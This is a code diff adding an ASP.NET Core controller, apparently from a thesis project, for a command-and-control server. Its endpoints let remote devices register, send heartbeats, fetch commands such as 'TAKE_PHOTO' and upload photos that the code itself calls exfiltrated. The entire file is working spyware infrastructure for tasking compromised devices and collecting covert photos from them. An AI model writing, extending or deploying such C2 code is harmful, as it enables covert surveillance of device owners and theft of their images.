@@ -1,0 +1,67 @@
+﻿using Microsoft.AspNetCore.Mvc;
+using tesis.DTOs;
+using tesis.Services;
+
+namespace tesis.Controllers
+{
+    [Route("api/[controller]")]
+    [ApiController]
+    public class DevicesController : ControllerBase
+    {
+        private readonly C2Service _c2Service;
+
+        public DevicesController(C2Service c2Service)
+        {
+            _c2Service = c2Service;
+        }
+
+        // POST: api/devices/register
+        [HttpPost("register")]
+        public async Task<IActionResult> Register([FromBody] RegisterDeviceDto dto)
+        {
+            // Capturamos la IP real de la petición
+            var ip = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
+
+            await _c2Service.RegisterDeviceAsync(dto, ip);
+            return Ok(new { message = "Dispositivo registrado/actualizado" });
+        }
+
+        // POST: api/devices/heartbeat
+        [HttpPost("heartbeat")]
+        public async Task<IActionResult> Heartbeat([FromBody] HeartbeatDto dto)
+        {
+            await _c2Service.UpdateHeartbeatAsync(dto.DeviceId);
+            return Ok(new { status = "alive" });
+        }
+
+        // GET: api/devices/{id}/commands
+        [HttpGet("{id}/commands")]
+        public async Task<IActionResult> GetCommands(string id)
+        {
+            var commands = await _c2Service.GetPendingCommandsAsync(id);
+            return Ok(commands); // Devuelve array JSON: [{"command": "TAKE_PHOTO", "id": 5}]
+        }
+
+        // POST: api/devices/upload-photo
+        // Acepta Multipart/Form-Data
+        // POST: api/devices/upload-photo
+        [HttpPost("upload-photo")]
+        public async Task<IActionResult> UploadPhoto([FromForm] PhotoUploadDto dto)
+        {
+            // Validaciones básicas
+            if (dto.File == null || dto.File.Length == 0)
+                return BadRequest("No se envió ningún archivo.");
+
+            if (string.IsNullOrEmpty(dto.DeviceId))
+                return BadRequest("Falta el Device ID.");
+
+            // Llamamos al servicio desglosando el DTO
+            var success = await _c2Service.SaveExfiltratedPhotoAsync(dto.DeviceId, dto.File);
+
+            if (!success)
+                return BadRequest("Error al guardar la foto o dispositivo no encontrado.");
+
+            return Ok(new { message = "Evidencia guardada exitosamente" });
+        }
+    }
+}
